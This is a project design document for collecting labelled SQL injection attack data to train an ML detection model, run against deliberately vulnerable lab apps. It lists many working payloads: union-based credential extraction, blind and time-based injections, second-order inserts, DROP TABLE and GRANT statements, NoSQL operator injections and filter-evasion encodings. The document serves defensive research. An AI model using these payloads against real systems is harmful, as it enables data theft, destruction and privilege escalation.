# Module 1: Attack Data Collection System

## Module 1 - SQLi Data Collection Overview

### Purpose
Generate and systematically collect SQL injection attack data using industry-standard penetration testing tools to create comprehensive, labeled datasets for machine learning model training.

### Module Objectives
1. Generate realistic SQL injection attack payloads
2. Collect attack data across all major SQLi attack types
3. Extract comprehensive feature sets from attacks
4. Create balanced, labeled datasets for ML training
5. Document attack variations and evasion techniques

---

## Attack Types Collection

### 1. Union-Based SQL Injection Collection

**Attack Mechanism:**
- Exploits UNION operator to combine query results
- Requires knowledge of column count and data types
- Allows cross-table data extraction

**Payload Variations:**
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT 1,2,version(),4,5--
' UNION SELECT table_name FROM information_schema.tables--
' UNION ALL SELECT null,table_name FROM information_schema.tables--
' /*!UNION*/ SELECT 1,2,3--
' %55NION SELECT 1,2,3--
```

**Collection Metrics:**
- Expected samples: 15,000-20,000
- Detection difficulty: Medium
- Feature extraction focus: Query structure, keyword patterns

---

### 2. Error-Based SQL Injection Collection

**Attack Mechanism:**
- Forces database errors to expose system information
- Leverages database-specific functions
- Reveals database version, structure, and data

**Payload Variations:**
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
' GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--
' OR 1 GROUP BY CONCAT((SELECT version()),FLOOR(RAND()*2))--
' AND 1=CAST((SELECT version()) AS INT)--
```

**Collection Metrics:**
- Expected samples: 10,000-15,000
- Detection difficulty: Medium
- Feature extraction focus: Function signatures, error patterns

---

### 3. Boolean-Based Blind SQL Injection Collection

**Attack Mechanism:**
- Infers data through true/false conditions
- No direct error messages or data output
- Character-by-character data extraction

**Payload Variations:**
```sql
' AND 1=1--
' AND 1=2--
' AND (SELECT COUNT(*) FROM users)>0--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>64--
' OR '1'='1
' AND IF(1=1,TRUE,FALSE)--
' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

**Collection Metrics:**
- Expected samples: 15,000-20,000
- Detection difficulty: High
- Feature extraction focus: Conditional logic, query repetition patterns

---

### 4. Time-Based Blind SQL Injection Collection

**Attack Mechanism:**
- Uses database delay functions to infer information
- Response timing indicates true/false conditions
- Character-by-character information extraction

**Payload Variations:**
```sql
'; WAITFOR DELAY '00:00:05'--
' AND IF(1=1,SLEEP(5),0)--
' OR IF((SELECT COUNT(*) FROM users)>0,SLEEP(3),0)--
' AND (SELECT SLEEP(2) WHERE database()='dvwa')--
' AND BENCHMARK(5000000,SHA1('test'))--
' OR SLEEP(5)--
```

**Collection Metrics:**
- Expected samples: 12,000-15,000
- Detection difficulty: Very High
- Feature extraction focus: Response timing, delay patterns

---

### 5. Second-Order SQL Injection Collection

**Attack Mechanism:**
- Stores malicious input in database
- Executes later when stored data is used
- Bypasses initial security checks

**Attack Sequence:**
```sql
-- Stage 1: Injection stored during user registration
username: admin'; INSERT INTO users VALUES('hacker','password123');--
password: anything

-- Stage 2: Execution occurs during login or data retrieval
SELECT * FROM users WHERE username='admin'; INSERT INTO users VALUES('hacker','password123');--'

-- Additional variations:
-- Comment insertion: admin' /**/; DROP TABLE users;--
-- Data update: admin'; UPDATE users SET role='admin' WHERE id=1;--
-- Privilege escalation: admin'; GRANT ALL ON *.* TO 'hacker'@'%';--
```

**Collection Metrics:**
- Expected samples: 8,000-10,000
- Detection difficulty: Very High
- Feature extraction focus: Historical query correlation, data lineage

---

### 6. NoSQL Injection Collection

**Attack Mechanism:**
- Targets non-relational databases (MongoDB, etc.)
- Exploits document query operators
- Bypasses authentication and extracts data

**Payload Variations:**
```javascript
// Basic operator injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "admin"}, "password": {"$exists": true}}

// Advanced operators
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": [""]}, "password": {"$nin": [""]}}
{"$where": "this.username == 'admin' && this.password == 'password'"}

// String concatenation
{"username": "admin', ')}//"}

// Array injection
{"$where": "function() { return this.username == 'admin' && this.password == 'test' }"}
```

**Collection Metrics:**
- Expected samples: 8,000-10,000
- Detection difficulty: High
- Feature extraction focus: NoSQL operators, JSON syntax

---

## Collection Methodology

### Step 1: Test Environment Setup

```bash
# Deploy vulnerable applications
- DVWA (Damn Vulnerable Web Application)
- WebGoat - Advanced SQL injection training
- Custom vulnerable test application

# Configure test databases
- PostgreSQL with sample data
- MySQL with injection targets
- MongoDB with NoSQL targets
- SQLite for lightweight testing

# Network configuration
- Isolated test network
- Comprehensive query logging enabled
- Traffic capture at application layer
```

### Step 2: Automated Payload Generation

```python
import sqlmap
from burp_api import BurpAPI
from zapv2 import ZAPv2

# Initialize testing tools
sqlmap_config = {
    'target': 'http://vulnerable-app',
    'parameters': 'id,username,email',
    'batch_mode': True,
    'verbose': 3,
    'output_dir': '/data/sqlmap_results'
}

burp_suite = BurpAPI(host='localhost', port=8080)
zap_scanner = ZAPv2(proxies={'http': 'http://localhost:8080'})

# Generate and capture attacks
attacks = generate_attack_payloads()
for attack in attacks:
    response = execute_attack(attack)
    log_attack_data(attack, response)
```

### Step 3: Feature Extraction

**Syntactic Features:**
- Query length (characters and tokens)
- SQL keyword frequency
- Special character distribution
- Comment patterns and usage
- Parentheses nesting depth
- Operator frequency

**Semantic Features:**
- Table and column references
- UNION operator patterns
- Function usage and parameters
- Predicate structure
- Data type indicators

**Behavioral Features:**
- Query execution time
- Response size and patterns
- Error message content
- Result row count
- Cache hit/miss indicators

**Contextual Features:**
- User session information
- Request geographic origin
- User agent patterns
- Time-of-day characteristics

### Step 4: Dataset Preparation

**Data Processing Pipeline:**
```
Raw Attack Data
    ↓
[Parsing & Validation]
- Extract query content
- Verify attack success/failure
- Document error messages
- Record timing characteristics
    ↓
[Normalization]
- Standardize encoding formats
- Remove session-specific data
- Anonymize sensitive information
    ↓
[Feature Engineering]
- Extract 200+ features
- Compute statistical measures
- Generate embeddings
    ↓
[Labeling]
- Classify attack type
- Assign severity level
- Mark success/failure
- Document evasion techniques
    ↓
[Validation]
- Quality assurance checks
- Duplicate detection and removal
- Balance verification
- Data integrity checks
    ↓
[Final Dataset]
- 100,000+ labeled samples
- 60% attacks, 40% benign queries
- Balanced across attack types
- Ready for ML training
```

---

## Evasion Techniques Collection

### URL Encoding Variations
```
Single encoding: %27 OR %201=%201
Double encoding: %252 7 OR %25201=%25201
Triple encoding: %25 25 27
Mixed: %27 OR 1=1 combined with 0x27
```

### Comment Insertion Methods
```sql
Standard comments: '/**/OR/**/1=1--
Database-specific: '; #comment
Nested comments: /* comment */ ' OR '1'='1
Multi-line: /* line1
            line2 */ SELECT
```

### Case Variations
```sql
Upper/Lower: SeLeCt * FrOm users
Mixed: Union Select 1,2,3
Unicode: Ünion SeLeCt
```

### Whitespace Manipulation
```sql
Multiple spaces: SELECT  *  FROM  users
Newlines: SELECT\nFROM\nusers
Tab characters: SELECT\tFROM\tusers
Null bytes: SELECT\x00FROM\x00users
```

---

## Dataset Statistics

### Expected Dataset Composition

| Attack Type | Samples | Percentage | Complexity |
|-------------|---------|-----------|-----------|
| Union-Based | 18,000 | 18% | Medium |
| Error-Based | 12,000 | 12% | Medium |
| Boolean-Blind | 18,000 | 18% | High |
| Time-Based Blind | 14,000 | 14% | High |
| Second-Order | 9,000 | 9% | Very High |
| NoSQL Injection | 9,000 | 9% | High |
| Benign Queries | 40,000 | 40% | N/A |
| **Total** | **100,000** | **100%** | - |

### Feature Statistics
- Total Features Extracted: 200+
- Syntactic Features: 45
- Semantic Features: 65
- Behavioral Features: 40
- Contextual Features: 50+

### Data Quality Metrics
- Duplicate Removal Rate: 5-8%
- Data Completeness: >95%
- Valid Records: >99%
- Label Accuracy: >98%

---

## Output Specifications

### Dataset Format
```python
{
    "id": "unique_attack_id",
    "payload": "' UNION SELECT username,password FROM users--",
    "attack_type": "Union-Based",
    "success": true,
    "source_ip": "192.168.1.100",
    "timestamp": "2025-09-20T10:30:45Z",
    "database_version": "MySQL 5.7",
    "query_structure": "normalized_query_here",
    "features": [0.45, 0.67, 0.23, ...],
    "evasion_techniques": ["url_encoding", "comment_insertion"],
    "response_time_ms": 145,
    "result_rows": 0,
    "error_message": "syntax error near '-- comment'",
    "severity": "HIGH"
}
```

### Deliverables
1. **Training Dataset** - 100,000+ labeled samples in CSV/JSON format
2. **Feature Vectors** - Extracted features for all samples
3. **Documentation** - Attack methodology and collection procedures
4. **Statistics Report** - Dataset composition and quality metrics
5. **Validation Scripts** - Data quality verification tools

---

## Integration with Module 2

Module 1 output feeds directly into Module 2 (Detection & Analysis Engine):
- Feature vectors used for ML model training
- Labeled samples for supervised learning
- Attack characteristics for signature database
- Attack variations for robustness testing

---

## Success Metrics

- ✓ 100,000+ labeled samples collected
- ✓ Coverage of all 6+ major SQLi attack types
- ✓ 10+ evasion techniques documented
- ✓ Feature extraction completeness >95%
- ✓ Dataset balance across attack types
- ✓ Data quality validation >99%
